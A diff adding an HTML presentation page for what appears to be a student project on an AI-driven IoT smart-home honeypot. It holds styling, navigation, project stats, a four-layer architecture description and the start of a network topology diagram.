@@ -1,0 +1,2191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI-Driven IoT Honeypot — PFE 2025</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500;700&family=Bebas+Neue&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#000000;
+  --surface:#0a0a0a;
+  --card:#111111;
+  --border:#222222;
+  --accent:#00e5c3;
+  --accent2:#60a5fa;
+  --red:#f87171;
+  --orange:#fb923c;
+  --purple:#c084fc;
+  --text:#e8e8e8;
+  --muted:#888888;
+  --sidebar:220px;
+}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;font-size:15px;display:flex;}
+
+/* SIDEBAR */
+#sidebar{
+  width:var(--sidebar);flex-shrink:0;
+  background:var(--surface);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;height:100vh;overflow-y:auto;
+}
+.sb-logo{padding:20px;border-bottom:1px solid var(--border);}
+.sb-brand{font-family:'DM Mono',monospace;font-size:11px;letter-spacing:3px;color:var(--accent);display:block;margin-bottom:4px;text-shadow:0 0 14px rgba(0,229,195,.4);}
+.sb-school{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:1px;color:var(--muted);}
+.sb-sec{padding:12px 0;}
+.sb-sec-lbl{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;padding:4px 20px 8px;}
+.si{
+  display:flex;align-items:center;gap:10px;
+  padding:9px 20px;cursor:pointer;
+  font-size:13px;color:var(--muted);
+  border-left:2px solid transparent;
+  transition:all .15s;user-select:none;
+}
+.si:hover{color:var(--text);background:rgba(255,255,255,.03);}
+.si.on{color:var(--text);border-left-color:var(--accent);background:rgba(0,229,195,.05);}
+.si.on .dot{background:var(--accent);}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--border);flex-shrink:0;}
+.sbadge{margin-left:auto;font-family:'DM Mono',monospace;font-size:8px;color:var(--accent);background:rgba(0,229,195,.1);padding:2px 6px;}
+.ss{
+  display:flex;align-items:center;gap:10px;
+  padding:7px 20px 7px 36px;cursor:pointer;
+  font-size:12px;color:var(--muted);
+  border-left:2px solid transparent;
+  transition:all .15s;user-select:none;
+}
+.ss:hover{color:var(--text);}
+.ss.on{color:var(--accent);border-left-color:var(--accent);background:rgba(0,229,195,.04);}
+.sb-footer{margin-top:auto;padding:16px 20px;border-top:1px solid var(--border);font-family:'DM Mono',monospace;font-size:9px;letter-spacing:1px;color:var(--muted);line-height:1.9;}
+
+/* MAIN */
+#main{flex:1;height:100vh;overflow-y:auto;background:var(--bg);}
+
+/* PAGES */
+.pg{display:none;}
+.pg.on{display:block;}
+
+/* PAGE HEADER */
+.ph{padding:32px 56px 24px;border-bottom:1px solid var(--border);background:var(--surface);position:sticky;top:0;z-index:5;}
+.ph-lbl{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:4px;color:var(--accent);text-transform:uppercase;margin-bottom:8px;}
+.ph-title{font-family:'Bebas Neue',sans-serif;font-size:clamp(28px,3vw,46px);color:#f1f5f9;letter-spacing:1px;line-height:1;}
+.ph-title span{color:var(--accent);}
+.ph-sub{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:6px;}
+
+/* SEC */
+.sec{padding:56px 60px;max-width:1180px;}
+.sh{font-size:20px;font-weight:700;color:#f1f5f9;margin-bottom:8px;}
+.sh span{color:var(--accent);}
+.sp{font-size:15px;color:#aaaaaa;line-height:1.7;margin-bottom:36px;max-width:580px;}
+
+/* GRID */
+.grid{display:grid;gap:2px;background:#2a2a2a;border:1px solid #2a2a2a;}
+.g2{grid-template-columns:repeat(2,1fr);}
+.g3{grid-template-columns:repeat(3,1fr);}
+.g4{grid-template-columns:repeat(4,1fr);}
+.card{background:var(--card);padding:28px;transition:background .15s;position:relative;overflow:hidden;}
+.card::before{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:var(--accent);opacity:0;transition:.15s;}
+.card:hover{background:#141e2e;}
+.card:hover::before{opacity:1;}
+.ct{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--accent);margin-bottom:8px;}
+.cd{font-size:13px;color:#aaaaaa;line-height:1.65;}
+
+/* LAYER STACK */
+.layers{display:flex;flex-direction:column;gap:2px;background:#2a2a2a;border:1px solid #2a2a2a;}
+.layer{display:grid;grid-template-columns:170px 1fr;gap:2px;background:#2a2a2a;}
+.ll{background:var(--card);padding:18px 20px;display:flex;flex-direction:column;justify-content:center;}
+.lnum{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);display:block;margin-bottom:4px;}
+.lname{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:1px;}
+.lr{background:var(--bg);padding:18px 22px;display:flex;flex-wrap:wrap;gap:6px;align-items:flex-start;}
+.chip{font-family:'DM Mono',monospace;font-size:9px;padding:3px 10px;border:1px solid;letter-spacing:1px;}
+.note{width:100%;font-size:13px;color:#999999;padding-top:10px;line-height:1.65;}
+
+/* SVG TOPO */
+.topo{background:var(--card);border:1px solid var(--border);padding:32px;position:relative;}
+.topo::before{content:'network_topology.svg';font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);position:absolute;top:12px;left:16px;}
+
+/* TERMINAL */
+.term{background:#020408;border:1px solid var(--border);border-top:2px solid var(--accent);font-family:'DM Mono',monospace;font-size:12px;line-height:1.9;padding:36px 26px 22px;position:relative;}
+.term::before{content:'● ● ●';position:absolute;top:10px;left:14px;color:var(--border);font-size:9px;letter-spacing:3px;}
+.c{color:var(--accent);}
+.g{color:#4ade80;}
+.b{color:var(--accent2);}
+.m{color:var(--muted);}
+.w{color:#f1f5f9;}
+.r{color:var(--red);}
+.o{color:var(--orange);}
+
+/* DOCKER NETS */
+.dnets{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);}
+.dnet{background:var(--card);padding:26px;}
+.dn-t{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;text-transform:uppercase;padding-bottom:12px;margin-bottom:16px;border-bottom:1px solid var(--border);}
+.dn-c .dn-t{color:var(--accent);}
+.dn-g .dn-t{color:#4ade80;}
+.ci{display:flex;gap:12px;padding:9px 0;border-bottom:1px solid var(--border);}
+.ci:last-child{border-bottom:none;}
+.cip{font-family:'DM Mono',monospace;font-size:9px;color:#888;min-width:65px;padding-top:2px;}
+.cn{font-family:'DM Mono',monospace;font-size:10px;display:block;margin-bottom:4px;}
+.dn-c .cn{color:var(--accent);}
+.dn-g .cn{color:#4ade80;}
+.cp{display:flex;flex-wrap:wrap;gap:3px;}
+.pt{font-family:'DM Mono',monospace;font-size:9px;padding:2px 7px;border:1px solid #333;color:#999;}
+
+/* FLOW */
+.flow{display:flex;background:var(--border);border:1px solid var(--border);}
+.fs{background:var(--card);flex:1;min-width:100px;padding:20px 12px;text-align:center;position:relative;}
+.fs::after{content:'›';position:absolute;right:-11px;top:50%;transform:translateY(-50%);color:var(--accent);font-size:22px;z-index:2;}
+.fs:last-child::after{display:none;}
+.fsi{font-size:20px;display:block;margin-bottom:8px;}
+.fsn{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:3px;}
+.fsd{font-size:11px;color:var(--muted);}
+
+/* BARS */
+.bars{background:var(--card);border:1px solid var(--border);padding:26px;}
+.bars-t{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:22px;}
+.br{display:flex;align-items:center;gap:14px;margin-bottom:10px;}
+.brl{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);min-width:140px;text-align:right;}
+.brt{flex:1;height:18px;background:var(--bg);}
+.brf{height:100%;display:flex;align-items:center;justify-content:flex-end;padding-right:7px;font-family:'DM Mono',monospace;font-size:9px;color:#000;font-weight:700;}
+
+/* TABLE */
+.tbl{width:100%;border-collapse:collapse;font-family:'DM Mono',monospace;font-size:11px;}
+.tbl th{background:var(--bg);color:var(--accent);padding:10px 13px;text-align:left;font-size:9px;letter-spacing:2px;text-transform:uppercase;border-bottom:1px solid var(--border);}
+.tbl td{padding:11px 14px;border-bottom:1px solid var(--border);color:#dddddd;}
+.tbl tr:hover td{background:rgba(255,255,255,.02);}
+
+/* CHECKLIST */
+.cklist{display:grid;grid-template-columns:1fr 1fr;gap:2px;background:#2a2a2a;border:1px solid #2a2a2a;}
+.ck{background:var(--card);padding:13px 18px;display:flex;align-items:center;gap:12px;font-size:13px;color:#e0e0e0;}
+.ck.ok{background:#0a1a12;}
+.cki{font-family:'DM Mono',monospace;font-size:12px;color:var(--accent);flex-shrink:0;}
+
+/* KILL CHAIN */
+.kc{border:1px solid var(--border);}
+.kch{display:grid;grid-template-columns:44px 150px 1fr 200px;background:var(--bg);border-bottom:1px solid var(--border);}
+.kch>div{padding:9px 13px;font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);text-transform:uppercase;border-right:1px solid var(--border);}
+.kch>div:last-child{border-right:none;}
+.kcr{display:grid;grid-template-columns:44px 150px 1fr 200px;border-top:1px solid var(--border);}
+.kcn{background:var(--bg);display:flex;align-items:center;justify-content:center;font-family:'Bebas Neue',sans-serif;font-size:22px;color:var(--border);border-right:1px solid var(--border);}
+.kcp{background:var(--card);padding:13px;font-family:'DM Mono',monospace;font-size:9px;letter-spacing:1px;color:var(--accent);text-transform:uppercase;display:flex;align-items:center;border-right:1px solid var(--border);line-height:1.5;}
+.kca{background:var(--bg);padding:13px;font-size:13px;color:var(--text);display:flex;flex-direction:column;justify-content:center;gap:3px;border-right:1px solid var(--border);}
+.kca small{font-size:11px;color:var(--muted);}
+.kcl{background:var(--card);padding:13px;font-family:'DM Mono',monospace;font-size:9px;color:var(--accent);line-height:1.9;display:flex;flex-direction:column;justify-content:center;}
+
+/* HIGHLIGHT */
+.hl{border-left:3px solid var(--accent);background:#071420;padding:18px 22px;margin:24px 0;}
+.hlt{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;margin-bottom:7px;}
+.hld{font-size:14px;color:var(--text);line-height:1.7;}
+.hld strong{color:var(--accent);}
+
+/* STAGE BADGES */
+.sbadge2{display:inline-flex;align-items:center;font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;text-transform:uppercase;padding:9px 14px;margin-bottom:18px;border-left:2px solid;}
+.sc{color:var(--accent);background:rgba(0,229,195,.05);border-color:var(--accent);}
+.sg{color:#4ade80;background:rgba(74,222,128,.05);border-color:#4ade80;}
+.sb2{color:var(--accent2);background:rgba(59,130,246,.05);border-color:var(--accent2);}
+.so{color:var(--orange);background:rgba(249,115,22,.05);border-color:var(--orange);}
+
+/* RULE */
+.rule{border:none;border-top:1px solid var(--border);margin:40px 0;}
+
+/* FOOTER */
+.pf{border-top:1px solid var(--border);padding:22px 56px;display:flex;justify-content:space-between;align-items:center;background:var(--surface);margin-top:40px;}
+.pfl{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);}
+.pfr{font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);text-align:right;line-height:1.8;}
+.pfr .ok{color:var(--accent);}
+
+/* INTRO */
+.hero{
+  min-height:calc(100vh - 52px);
+  background:radial-gradient(ellipse 800px 500px at 65% 25%,rgba(0,229,195,.04) 0%,transparent 60%),
+             radial-gradient(ellipse 500px 350px at 10% 75%,rgba(0,229,195,.03) 0%,transparent 60%);
+  display:flex;flex-direction:column;justify-content:center;
+  padding:72px 56px;position:relative;overflow:hidden;
+}
+.hero-grid{
+  position:absolute;inset:0;
+  background-image:linear-gradient(rgba(0,229,195,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,195,.018) 1px,transparent 1px);
+  background-size:80px 80px;
+}
+.eyebrow{font-family:'DM Mono',monospace;font-size:10px;letter-spacing:4px;color:var(--accent);text-transform:uppercase;margin-bottom:18px;text-shadow:0 0 14px rgba(0,229,195,.4);}
+.htitle{font-family:'Bebas Neue',sans-serif;font-size:clamp(46px,7vw,100px);line-height:.92;letter-spacing:2px;color:#f1f5f9;margin-bottom:18px;}
+.htitle .t1{color:var(--accent);text-shadow:0 0 40px rgba(0,229,195,.25);}
+.htitle .t2{color:var(--accent2);text-shadow:0 0 40px rgba(59,130,246,.25);}
+.hdesc{font-size:16px;color:#aaaaaa;max-width:540px;line-height:1.75;margin-bottom:36px;font-weight:400;}
+.hdesc strong{color:var(--text);}
+.pills{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:48px;}
+.pill{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:1px;padding:4px 12px;border:1px solid var(--border);color:var(--muted);text-transform:uppercase;transition:all .2s;}
+.pill:hover{border-color:var(--accent);color:var(--accent);}
+.stats{display:flex;gap:1px;background:var(--border);border:1px solid var(--border);width:fit-content;}
+.stat{background:var(--card);padding:18px 26px;text-align:center;}
+.sv{font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--accent);line-height:1;display:block;text-shadow:0 0 18px rgba(0,229,195,.25);}
+.sl{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);text-transform:uppercase;display:block;margin-top:4px;}
+
+/* VALUE CARDS */
+.vcards{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--border);border:1px solid var(--border);}
+.vc{background:var(--card);padding:28px;transition:background .15s;}
+.vc:hover{background:#141e2e;}
+.vcn{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:10px;}
+.vct{font-size:15px;font-weight:700;color:#f1f5f9;margin-bottom:7px;}
+.vcd{font-size:13px;color:#aaaaaa;line-height:1.65;}
+
+/* 5 STAGES */
+.stages{display:grid;grid-template-columns:repeat(5,1fr);gap:1px;background:var(--border);border:1px solid var(--border);}
+.stage{background:var(--card);padding:22px 18px;position:relative;cursor:pointer;transition:background .15s;}
+.stage:hover{background:#141e2e;}
+.stage.done{background:#0a1a12;}
+.stage-done{position:absolute;top:13px;right:13px;font-family:'DM Mono',monospace;font-size:9px;color:var(--accent);text-shadow:0 0 8px rgba(0,229,195,.4);}
+.snum{font-family:'Bebas Neue',sans-serif;font-size:46px;color:var(--border);display:block;line-height:1;margin-bottom:6px;}
+.stage.done .snum{color:rgba(0,229,195,.12);}
+.sname{font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);display:block;margin-bottom:5px;}
+.stage.done .sname{color:var(--accent);}
+.sdesc{font-size:12px;color:#666666;line-height:1.5;}
+
+@media(max-width:960px){
+  :root{--sidebar:56px;}
+  .sb-brand,.sb-school,.sb-sec-lbl,.sb-footer,.sbadge,.ss span,.si span{display:none;}
+  .sec,.pf{padding-left:24px;padding-right:24px;}
+  .ph{padding:22px 24px;}
+  .dnets,.g2,.g3,.g4,.cklist,.vcards,.stages{grid-template-columns:1fr;}
+  .kcr,.kch{grid-template-columns:40px 1fr;}
+  .kca,.kcl{display:none;}
+  .layer{grid-template-columns:1fr;}
+  .stats{flex-direction:column;}
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="sb-logo">
+    <span class="sb-brand">⬡ IOT_HONEYPOT</span>
+    <span class="sb-school">PFE 2026 // ESTIN</span>
+  </div>
+
+  <div class="sb-sec">
+    <div class="sb-sec-lbl">Overview</div>
+    <div class="si on" onclick="go('intro')"><span class="dot"></span><span>Introduction</span></div>
+  </div>
+
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Stage 01 — Done</div>
+    <div class="si" onclick="go('dev')"><span class="dot"></span><span>Development</span><span class="sbadge">✓</span></div>
+    <div class="ss" onclick="go('iot-arch')"><span class="dot"></span><span>IoT Architecture</span></div>
+    <div class="ss" onclick="go('net-topo')"><span class="dot"></span><span>Network Topology</span></div>
+    <div class="ss" onclick="go('docker')"><span class="dot"></span><span>Docker Networks</span></div>
+    <div class="ss" onclick="go('conception')"><span class="dot"></span><span>Conception</span></div>
+    <div class="ss" onclick="go('testing')"><span class="dot"></span><span>Testing</span></div>
+  </div>
+
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Stage 02 — Done</div>
+    <div class="si" onclick="go('deploy')"><span class="dot"></span><span>Deployment</span><span class="sbadge">✓</span></div>
+  </div>
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Stage 03 — Done</div>
+    <div class="si" onclick="go('collect')"><span class="dot"></span><span>Collection</span><span class="sbadge">✓</span></div>
+  </div>
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Stage 04 — Done</div>
+    <div class="si" onclick="go('train')"><span class="dot"></span><span>AI Training</span><span class="sbadge">✓</span></div>
+    <div class="ss" onclick="go('train-ds')"><span class="dot"></span><span>Data Science</span></div>
+    <div class="ss" onclick="go('train-def')"><span class="dot"></span><span>Defensive AI</span></div>
+    <div class="ss" onclick="go('train-off')"><span class="dot"></span><span>Offensive RL</span></div>
+  </div>
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Stage 05</div>
+    <div class="si" onclick="go('report')"><span class="dot"></span><span>Report</span><span class="sbadge">✓</span></div>
+  </div>
+  <div class="sb-sec" style="border-top:1px solid var(--border)">
+    <div class="sb-sec-lbl">Live Demo</div>
+    <div class="si" onclick="go('live-test')"><span class="dot"></span><span>Live Testing</span><span class="sbadge" style="color:#f87171;background:rgba(248,113,113,.1)">AI</span></div>
+  </div>
+
+  <div class="sb-footer">Bouzira Mohamed<br>Bakhti Rayane<br><br>Encadrant:<br>Dr Oussama Allama<br><br>ESTIN 2026</div>
+</nav>
+
+<!-- MAIN -->
+<div id="main">
+
+<!-- ══════ INTRO ══════ -->
+<div id="pg-intro" class="pg on">
+  <div class="hero">
+    <div class="hero-grid"></div>
+    <div style="position:relative;z-index:1">
+      <div class="eyebrow">▶ ESTIN University — PFE 2026 — Bouzira Mohamed &amp; Bakhti Rayane Abderaouef</div>
+      <div class="htitle">AI-DRIVEN<br><span class="t1">IOT SMART-HOME</span><br><span class="t2">HONEYPOT</span></div>
+      <p class="hdesc">A <strong>cloud-deployable honeypot</strong> that simulates a real smart-home to attract attackers, capture multi-protocol IoT traffic, and generate <strong>real-world labeled data</strong> for AI-driven defensive detection and offensive attack simulation.</p>
+      <div class="pills">
+        <span class="pill">IoT</span><span class="pill">CyberSecurity</span><span class="pill">Cloud</span>
+        <span class="pill">DataScience</span><span class="pill">MachineLearning</span><span class="pill">ReinforcementLearning</span>
+        <span class="pill">Programing</span><span class="pill">Docker</span><span class="pill">Network</span><span class="pill">ELKstack</span>
+      </div>
+      <div class="stats">
+        <div class="stat"><span class="sv">8</span><span class="sl">IoT Devices</span></div>
+        <div class="stat"><span class="sv">3</span><span class="sl">Protocols</span></div>
+        <div class="stat"><span class="sv">1.2M+</span><span class="sl">Packets/Day</span></div>
+        <div class="stat"><span class="sv">6</span><span class="sl">ElasticSearch Indices</span></div>
+        <div class="stat"><span class="sv">11</span><span class="sl">Containers</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sec">
+    <div class="sh">Why This Project is <span>Unique</span></div>
+    <p class="sp">Real-world IoT attack data — not synthetic. The full smart-home protocol stack captured and labeled automatically.</p>
+    <div class="vcards" style="margin-bottom:48px">
+      <div class="vc">
+        <span class="vcn">Purpose</span>
+        <div class="vct">Real-World Attack Data</div>
+        <div class="vcd">Authentic smart-home telemetry mixed with real attacker patterns. Every event timestamped and labeled for AI training.</div>
+      </div>
+      <div class="vc">
+        <span class="vcn">Where to use it</span>
+        <div class="vct">Academic &amp; Enterprise</div>
+        <div class="vcd">IoT ML research, red-team training, enterprise deception technology, malware capture in a safe environment.</div>
+      </div>
+      <div class="vc">
+        <span class="vcn">Why best</span>
+        <div class="vct">Full IoT Protocol Stack</div>
+        <div class="vcd">MQTT, CoAP, HTTP simultaneously captured and indexed. No open dataset covers the complete smart-home attack surface like this.</div>
+      </div>
+    </div>
+
+    <div class="sh">5 Stages to <span>Full System</span></div>
+    <p class="sp">From architecture design to AI deployment.</p>
+    <div class="stages">
+      <div class="stage done">
+        <span class="stage-done">✓</span>
+        <span class="snum">01</span>
+        <span class="sname">Development</span>
+        <div class="sdesc">Architecture, services, ELK, Docker, testing</div>
+      </div>
+      <div class="stage done"><span class="stage-done">✓</span><span class="snum">02</span><span class="sname">Deployment</span><div class="sdesc">GCP Madrid · VM live · ports open</div></div>
+      <div class="stage done"><span class="stage-done">✓</span><span class="snum">03</span><span class="sname">Collection</span><div class="sdesc">2.5M hits · 35K attacks · 1600 IPs</div></div>
+      <div class="stage done"><span class="stage-done">✓</span><span class="snum">04</span><span class="sname">Training</span><div class="sdesc">XGBoost · Autoencoder · RL</div></div>
+      <div class="stage" style="border-left:2px solid var(--accent)"><span class="snum">05</span><span class="sname">Report</span><div class="sdesc">Complete ✓</div></div>
+    </div>
+  </div>
+
+  <div class="pf">
+    <div class="pfl">PFE_IOT_HONEYPOT // ESTIN 2025</div>
+    <div class="pfr">Bouzira Mohamed &amp; Bakhti Rayane Abderaouef<br><span class="ok">Stage 01 — Development ✓ Complete</span></div>
+  </div>
+</div>
+
+<!-- ══════ DEV OVERVIEW ══════ -->
+<div id="pg-dev" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Stage 01 — Complete ✓</div>
+    <div class="ph-title"><span>Development</span></div>
+    <div class="ph-sub">5 phases — IoT Architecture · Network Topology · Docker Networks · Conception · Testing</div>
+  </div>
+  <div class="sec">
+      <div class="card"><div class="ct">📐 Phase 1 — IoT Architecture</div><div class="cd">4-layer model. 8 virtual smart-home devices. 3 IoT protocols. IoT platform. Processing layer.</div></div><br>
+      <div class="card"><div class="ct">🌐 Phase 2 — Network Topology</div><div class="cd">Internet → Router → Firewall/AI → Server. Edge computing topology. Two isolated Docker networks. Hidden ELK backbone.</div></div><br>
+      <div class="card"><div class="ct">🐳 Phase 3 — Docker Networks</div><div class="cd">honeypot_net (bridge) + elk_net (internal). 11 containers with fixed IPs. Shared log volume. filebeat ship between containers</div></div><br>
+      <div class="card"><div class="ct">⚙️ Phase 4 — Conception</div><div class="cd">Main-server (Cowrie + MQTT + CoAP + HTTP), IoT Platform (Flask), ELK config, Docker Compose.</div></div><br>
+    <div class="hl" style="margin-top:32px">
+      <div class="hlt">// Result</div>
+      <div class="hld">All 11 containers running — <strong>1.2M+ packets/day</strong> captured — all 6 Elasticsearch indices active — cloud-ready.</div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">DEVELOPMENT // STAGE 01</div><div class="pfr"><span class="ok">All 5 phases complete</span></div></div>
+</div>
+
+<!-- ══════ IoT ARCHITECTURE ══════ -->
+<div id="pg-iot-arch" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Development — Phase 1</div>
+    <div class="ph-title">IoT <span>Architecture</span></div>
+    <div class="ph-sub">4-layer model — perception → network → processing → application</div>
+  </div>
+  <div class="sec">
+    <p class="sp">The most common 4-layer IoT architecture.<br>Usually SmartHomes don't have Processing Layer (layer 3)<br>In our case we need it for HoneyPot environment</p>
+
+    <div class="layers">
+      <!-- L4 -->
+      <div class="layer">
+        <div class="ll"><span class="lnum">LAYER 4</span><div class="lname" style="color:var(--accent)">Application</div></div>
+        <div class="lr">
+          <span class="chip" style="border-color:#004433;color:var(--accent)">IoT Platform Dashboard</span>
+          <span class="chip" style="border-color:#004433;color:var(--accent)">Server-Side Rendering</span>
+          <span class="chip" style="border-color:#004433;color:var(--accent)">WebSocket</span>
+          <span class="chip" style="border-color:#004433;color:var(--accent)">RestAPI</span>
+          <span class="chip" style="border-color:#004433;color:var(--accent)">Kibana-Dashboard</span>
+          <div class="note">Visualize all device states in real-time. Issue commands to any device. Monitor threats.</div>
+        </div>
+      </div>
+      <!-- L3 -->
+      <div class="layer">
+        <div class="ll"><span class="lnum">LAYER 3</span><div class="lname" style="color:#4ade80">Processing</div></div>
+        <div class="lr">
+          <span class="chip" style="border-color:#1a4d2a;color:#4ade80">Filebeat</span>
+          <span class="chip" style="border-color:#1a4d2a;color:#4ade80">Logstash</span>
+          <span class="chip" style="border-color:#1a4d2a;color:#4ade80">ElasticSearch</span>
+          <span class="chip" style="border-color:#1a4d2a;color:#4ade80">Kibana</span>
+          <span class="chip" style="border-color:#1a4d2a;color:#4ade80">Version 8.6</span>
+          <div class="note"><strong style="color:#4ade80">⚠ Smart homes don't have this layer —</strong>. Hidden full stack ELK network captures all traffic silently.</div>
+        </div>
+      </div>
+      <!-- L2 -->
+      <div class="layer">
+        <div class="ll"><span class="lnum">LAYER 2</span><div class="lname" style="color:var(--accent2)">Network</div></div>
+        <div class="lr">
+          <div style="width:100%">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px">2.1 — DATA LINK SUBLAYER</div>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">Wire connection</span>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">Ethernet protocol</span>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">Docker Bridge</span>
+          </div>
+          <div style="width:100%;margin-top:14px">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px">2.2 — TRANSPORT SUBLAYER (IoT device protocols)</div>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">MQTT (TCP:1883)</span>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">HTTP (TCP:8080)</span>
+            <span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">CoAP (UDP:5683)</span>
+          </div>
+        </div>
+      </div>
+      <!-- L1 -->
+      <div class="layer">
+        <div class="ll"><span class="lnum">LAYER 1</span><div class="lname" style="color:var(--orange)">Perception</div></div>
+        <div class="lr">
+          <div style="width:100%">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--muted);margin-bottom:8px">COMMUNICATION OBJECTS — capture data &amp; transmit</div>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🔒 Smart Lock</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🌡️ Thermostat</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🚨 Alarm System</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🔌 Smart Plug</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">📹 IP Camera</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🔔 Doorbell</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">💡 Smart Bulb</span>
+            <span class="chip" style="border-color:#3d1f00;color:var(--orange)">🏃 Motion</span>
+          </div>
+          <div class="note">
+            Each object has 4 units:<br>
+            <strong style="color:var(--text)">Compute</strong> (Arduino equivalent / Python process) ·<br>
+            <strong style="color:var(--text)">Communication</strong> (RJ45 / Docker eth) ·<br>
+            <strong style="color:var(--text)">Energy</strong> (Docker runtime) ·<br>
+            <strong style="color:#f43f5e">Capture</strong> — <em style="color:var(--muted)">no capture unit here since virtual — data is randomly generated</em>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">IoT ARCHITECTURE // PHASE 01</div><div class="pfr">4-Layer Model — Perception → Network → Processing → Application</div></div>
+</div>
+
+<!-- ══════ NETWORK TOPOLOGY ══════ -->
+<div id="pg-net-topo" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Development — Phase 2</div>
+    <div class="ph-title">Network <span>Topology</span></div>
+    <div class="ph-sub">edge computing on cloud IaaS</div>
+  </div>
+  <div class="sec">
+    <p class="sp">Internet → Router → Firewall (AI model) → Main Server → IoT Devices. Hidden ELK network invisible to attackers.</p>
+
+    <div class="topo" style="margin-bottom:28px">
+      <svg viewBox="0 0 1200 720" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
+        <defs>
+          <marker id="a1" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#666"/></marker>
+          <marker id="a2" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00e5c3"/></marker>
+          <marker id="a3" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#4ade80"/></marker>
+        </defs>
+        <rect width="1200" height="720" fill="#000"/>
+
+        <!-- ── INTERNET ── -->
+        <rect x="6" y="60" width="136" height="154" rx="3" fill="#0a0a0a" stroke="#444" stroke-width="1.5"/>
+        <text x="74" y="78" fill="#555" font-family="monospace" font-size="9" text-anchor="middle" letter-spacing="3">INTERNET</text>
+        <rect x="14" y="85" width="54" height="20" rx="2" fill="#0a0a0a" stroke="#f43f5e"/>
+        <text x="41" y="99" fill="#f43f5e" font-family="monospace" font-size="8" text-anchor="middle">BOTS/ATK</text>
+        <rect x="74" y="85" width="60" height="20" rx="2" fill="#0a0a0a" stroke="#fb923c"/>
+        <text x="104" y="99" fill="#fb923c" font-family="monospace" font-size="8" text-anchor="middle">SCANNERS</text>
+        <rect x="14" y="111" width="120" height="20" rx="2" fill="#0a0a0a" stroke="#f43f5e"/>
